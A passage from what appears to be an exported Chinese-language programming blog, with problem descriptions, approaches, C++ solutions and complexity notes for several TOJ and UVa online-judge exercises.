<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>每天都有取或不取兩種選擇<br>定義DP式 $DP[i][j]$ 表示第 $i$ 天選或不選($j=0$或$j=1$)的最大成效值<br>可得轉移式<br>$DP[i][1] = max(DP[i-1][0]+arr[i], DP[i][1])$<br>$DP[i][0] = max(DP[i-1][1], DP[i-1][0])$<br>不過實作後會發現到每次會影響到的只有上一個狀態，所以只需要記錄前一個狀態即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> tmp,ans=<span class="number">0</span>,dp[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			dp[i%<span class="number">2</span>][<span class="number">0</span>]=max(dp[(i<span class="number">-1</span>)%<span class="number">2</span>][<span class="number">1</span>],dp[(i<span class="number">-1</span>)%<span class="number">2</span>][<span class="number">0</span>]);</span><br><span class="line">			dp[i%<span class="number">2</span>][<span class="number">1</span>]=max(dp[(i<span class="number">-1</span>)%<span class="number">2</span>][<span class="number">0</span>]+tmp,dp[i%<span class="number">2</span>][<span class="number">1</span>]);</span><br><span class="line">			ans=max(dp[i%<span class="number">2</span>][<span class="number">0</span>],dp[i%<span class="number">2</span>][<span class="number">1</span>]);</span><br><span class="line">			dp[(i<span class="number">-1</span>)%<span class="number">2</span>][<span class="number">0</span>] = dp[(i<span class="number">-1</span>)%<span class="number">2</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $2n$ 種狀態，每種狀態轉移時間複雜度為 $O(1)$<br>總時間複雜度為 $O(2n)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 474</title>
    <url>/2020/09/25/TOJ474/</url>
    <content><![CDATA[<h1 id="TOJ-474"><a href="#TOJ-474" class="headerlink" title="TOJ 474"></a>TOJ 474</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://toj.tfcis.org/oj/pro/474/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/474/</a><br>給定一個長方形的長與寬，以及一個整數 $k$ </br><br>求在長方形中能以連續 $k$ 個格子連線的數量有多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>依序找出橫向、直向、斜向的答案相加即可，數學題</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line">ll w,h,k;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;w&gt;&gt;h&gt;&gt;k;</span><br><span class="line">		ll A=(w-(k<span class="number">-1</span>)),B=(h-(k<span class="number">-1</span>));</span><br><span class="line">		A=(A&gt;<span class="number">0</span> ? A : <span class="number">0</span>),B=(B&gt;<span class="number">0</span> ? B : <span class="number">0</span>);</span><br><span class="line">		ll row=h*A;</span><br><span class="line">		ll col=w*B;</span><br><span class="line">		ll diag=<span class="number">2</span>*A*B;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;row+col+diag&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>每次的運算量都不大，總複雜度約為 $O(T)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 516</title>
    <url>/2021/03/23/TOJ516/</url>
    <content><![CDATA[<h1 id="UVa-516"><a href="#UVa-516" class="headerlink" title="UVa 516"></a>UVa 516</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?516" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?516</a></p>
<p>給一個數字 $X$ 質因數分解後式，求 $X-1$ 的質因數分解式</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>可以利用 stringstream 讀取輸入，取得所有數值就可以拿到 $X$ 以及 $X’=X-1$</p>
<p>至於質因數分解的部分，我們可以藉由質數篩的過程當中紀錄每個數字第一次是被誰篩掉(也就是最小因數)</p>
<p>例如: <code>10 -&gt; 2</code> <code>9 -&gt; 3</code> <code>17 -&gt; 17</code></p>
<p>如此一來，對於每個詢問 $X’$ 每次先找到最小因數 $p$ ，紀錄當前的值 $X’$ 可以被整除幾次，並且將 $X’$ 除以 $p$，直到 $X’$ 為 $1$ 的時候表示我們已經找完了</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">32768</span>;</span><br><span class="line"><span class="keyword">int</span> fact[MaxN], ans[MaxN][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="keyword">bool</span> fir;</span><br><span class="line"><span class="keyword">int</span> x,n,a,b,p,cnt,px;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">// 質數篩</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">2</span> ; i&lt;=MaxN ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!fact[i])&#123;</span><br><span class="line">			fact[i]=i;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> j=i*i ; j&lt;=MaxN ; j+=i)&#123;</span><br><span class="line">				<span class="keyword">if</span>(!fact[j])&#123;</span><br><span class="line">					fact[j]=i;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(getline(<span class="built_in">cin</span>,s))&#123;</span><br><span class="line">		<span class="keyword">if</span>(s==<span class="string">"0"</span>) <span class="keyword">break</span>;</span><br><span class="line">		fir=<span class="literal">true</span>; n=<span class="number">1</span>; px=<span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 計算 X</span></span><br><span class="line">		<span class="built_in">stringstream</span> ss;</span><br><span class="line">		ss&lt;&lt;s;</span><br><span class="line">		<span class="keyword">while</span>(ss&gt;&gt;x)&#123;</span><br><span class="line">			<span class="keyword">if</span>(fir) a=x;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				b=x;</span><br><span class="line">				n*=<span class="built_in">pow</span>(a,b);	</span><br><span class="line">			&#125;</span><br><span class="line">			fir=!fir;</span><br><span class="line">		&#125;</span><br><span class="line">		n--;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 質因數分解</span></span><br><span class="line">		<span class="keyword">while</span>(n!=<span class="number">1</span>)&#123;</span><br><span class="line">			p=fact[n];</span><br><span class="line">			cnt=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(n%p==<span class="number">0</span>)&#123;</span><br><span class="line">				cnt++;</span><br><span class="line">				n/=p;</span><br><span class="line">			&#125;</span><br><span class="line">			ans[px][<span class="number">0</span>]=p;</span><br><span class="line">			ans[px][<span class="number">1</span>]=cnt;</span><br><span class="line">			px++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=px<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">			<span class="keyword">if</span>(i!=px<span class="number">-1</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;ans[i][<span class="number">0</span>]&lt;&lt;<span class="string">" "</span>&lt;&lt;ans[i][<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>質數篩的複雜度為 $O(NloglogN)$</p>
<p>每筆測資計算 $X$ 時間複雜度約為 $O(\Omega(X))$</p>
<p>每筆測資質因數分解時間複雜度約為 $O(\Omega(X))$</p>
<p>每筆測資輸出時間複雜度約為 $O(\Omega(X))$</p>
<p>其中， $\Omega(X)$ 表示 $X$ 的不同質因數個數。$\Omega(X)$ 表示 $X$ 的質因數個數</p>
<p>總時間複雜度約為 $O(NloglogN + 2\Omega(X) + \Omega(X))$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 523</title>
    <url>/2021/03/23/TOJ523/</url>
    <content><![CDATA[<h1 id="TOJ-523"><a href="#TOJ-523" class="headerlink" title="TOJ 523"></a>TOJ 523</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/523/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/523/</a></p>
<p>給一個數 $x$ ，求他的十位數字</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先除以 $10$ 再模 $10$ 得解</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">	x/=<span class="number">10</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;x%<span class="number">10</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 522</title>
    <url>/2021/03/23/TOJ522/</url>
    <content><![CDATA[<h1 id="TOJ-522"><a href="#TOJ-522" class="headerlink" title="TOJ 522"></a>TOJ 522</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/522/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/522/</a></p>
<p>給一個數字 $x$ ，求 $x^2$ 的個位數字</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>平方後模 $10$ 取個位數即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">	x*=x;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;x%<span class="number">10</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 524</title>
    <url>/2021/03/23/TOJ524/</url>
    <content><![CDATA[<h1 id="TOJ-524"><a href="#TOJ-524" class="headerlink" title="TOJ 524"></a>TOJ 524</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/524/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/524/</a></p>
<p>給兩個數字 $x, y$ ，分別代表 $a+b$ 以及 $a-b$ ，求 $a, b$</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>可以藉由 $\frac{x+y}{2}$ 取得 $a$</p>
<p>再以 $x-a$ 取得 $b$ 即可得解</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,y;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">	<span class="keyword">int</span> a=(x+y)/<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">int</span> b=x-a;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"a: "</span>&lt;&lt;a&lt;&lt;<span class="string">", b: "</span>&lt;&lt;b&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 513</title>
    <url>/2021/03/23/TOJ513/</url>
    <content><![CDATA[<h1 id="TOJ-513"><a href="#TOJ-513" class="headerlink" title="TOJ 513"></a>TOJ 513</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/513/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/513/</a></p>
<p>給兩個以 24 進位制表示的時間，包含小時以及分鐘，分別表示開始以及結束的時間，其中保證兩者之間間隔不會超過 24 小時，但是可能跨天，求兩個時間的間隔是幾小時幾分。</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>分別算出兩者時間轉換成分鐘，這樣一來如果說結束時間比開始時間來的短，表示過了一天，再加上 $24*60$ 分鐘</p>
<p>最後只需要獲得間隔再轉成小時以及分鐘即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,c,d;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;c&gt;&gt;d;</span><br><span class="line">	<span class="keyword">int</span> start=a*<span class="number">60</span>+b;</span><br><span class="line">	<span class="keyword">int</span> end=c*<span class="number">60</span>+d;</span><br><span class="line">	<span class="keyword">if</span>(end-start&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		end+=<span class="number">24</span>*<span class="number">60</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> res=end-start;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"totally "</span>&lt;&lt; res/<span class="number">60</span> &lt;&lt;<span class="string">" hours and "</span>&lt;&lt; res%<span class="number">60</span> &lt;&lt;<span class="string">" minutes.\n"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>時間複雜度可記為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 530</title>
    <url>/2021/03/23/TOJ530/</url>
    <content><![CDATA[<h1 id="TOJ-530"><a href="#TOJ-530" class="headerlink" title="TOJ 530"></a>TOJ 530</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/530/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/530/</a></p>
<p>輸入 $n, m$ ，排序後輸出</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,m;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">if</span>(n&gt;m) <span class="built_in">cout</span>&lt;&lt;m&lt;&lt;<span class="string">" "</span>&lt;&lt;n&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="string">" "</span>&lt;&lt;m&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 526</title>
    <url>/2021/03/23/TOJ526/</url>
    <content><![CDATA[<h1 id="TOJ-526"><a href="#TOJ-526" class="headerlink" title="TOJ 526"></a>TOJ 526</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/526/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/526/</a></p>
<p>輸入一串數字，輸出數字的相反</p>
<p>例如: 521 輸出 125</p>
<p>不過當前綴是 0 時不需要顯示</p>
<h2 id="程式碼"><a href="#程式碼" class="headerlink" title="程式碼"></a>程式碼</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,m=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n)&#123;</span><br><span class="line">		m*=<span class="number">10</span>;</span><br><span class="line">		m+=(n%<span class="number">10</span>);</span><br><span class="line">		n/=<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;m&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1+log_{10}{n})$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 525</title>
    <url>/2021/03/23/TOJ525/</url>
    <content><![CDATA[<h1 id="TOJ-525"><a href="#TOJ-525" class="headerlink" title="TOJ 525"></a>TOJ 525</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/525/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/525/</a></p>
<p>給兩個正整數 $p, q$ 表示座標上的兩個座標點</p>
<p>求座標上一個整數座標點 $x$ ，使得 $\left|\left| p-x\right| - \left| q-x\right|\right| \le 1$</p>
<p>若有多組解，輸出座標點最小的那個</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>要離兩個點距離差相同，那也就是兩者的中點</p>
<p>可能出現小數點，只需要取整數就可以符合題目要輸出座標點最小的條件</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> p,q;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;p&gt;&gt;q;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;(<span class="keyword">int</span>)((p+q)/<span class="number">2</span>)&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 527</title>
    <url>/2021/03/23/TOJ527/</url>
    <content><![CDATA[<h1 id="TOJ-527"><a href="#TOJ-527" class="headerlink" title="TOJ 527"></a>TOJ 527</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/527/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/527/</a></p>
<p>給一個數 $N$</p>
<p>如果 $N$ 是 $9$ 的倍數就再加上 $9$</p>
<p>否則輸出一個比他的的數當中，是 $9$ 的倍數的最小值</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>在不是 $9$ 的倍數的情況下，可以先藉由 $N % 9$ 取得 $N$ 與前一個 $9$ 的倍數的距離</p>
<p>用 $9 - (N % 9)$ 就可以獲得 $N$ 與下一個 $9$ 的倍數的距離了</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">if</span>(n%<span class="number">9</span>==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;n+<span class="number">9</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;n+(<span class="number">9</span>-n%<span class="number">9</span>)&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 528</title>
    <url>/2021/03/23/TOJ528/</url>
    <content><![CDATA[<h1 id="TOJ-528"><a href="#TOJ-528" class="headerlink" title="TOJ 528"></a>TOJ 528</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/528/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/528/</a></p>
<p>輸出 $abs(n)$</p>
